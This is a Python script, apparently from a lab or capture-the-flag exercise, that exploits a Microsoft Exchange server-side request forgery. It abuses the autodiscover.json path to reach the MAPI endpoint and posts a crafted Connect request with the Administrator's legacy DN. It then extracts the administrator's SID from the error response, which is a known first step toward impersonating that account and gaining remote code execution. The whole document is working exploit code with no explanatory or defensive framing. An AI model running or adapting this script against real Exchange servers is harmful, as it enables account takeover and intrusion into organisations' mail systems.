#!/usr/bin/env python3
import requests, time, re
requests.packages.urllib3.disable_warnings()
url = "https://10.129.231.81/autodiscover/autodiscover.json?@test.com/mapi/emsmdb?&Email=autodiscover/autodiscover.json%3F@test.com"
legacy = "/o=EXCH01 Org/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=74c9e1b136b84873b8232eb70aa744dc-Administrator"
suffix = b'\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00'
headers_base = {
    "Content-Type":"application/mapi-http",
    "X-Requesttype":"Connect",
    "X-Clientapplication":"Outlook/15.1.2176.9",
    "X-Requestid":"diag",
    "Connection":"close",
}
for enc in ("utf-8","utf-16le"):
    payload = legacy.encode(enc) + suffix
    headers = headers_base.copy()
    headers["Content-Length"] = str(len(payload))
    print(f"\n[*] Trying encoding: {enc}, payload len {len(payload)}")
    try:
        r = requests.post(url, data=payload, headers=headers, verify=False, timeout=8)
        print(f"HTTP {r.status_code}")
        text = (r.text or "")[:1000]
        print("Body snippet:", repr(text))
        if "with SID" in text:
            m = re.search(r"with SID\s+([A-Za-z0-9\-\_]+)\s+and MasterAccountSid", text)
            if m:
                print("SID found:", m.group(1))
                break
    except requests.exceptions.RequestException as e:
        print("Request failed:", repr(e))
        time.sleep(1)

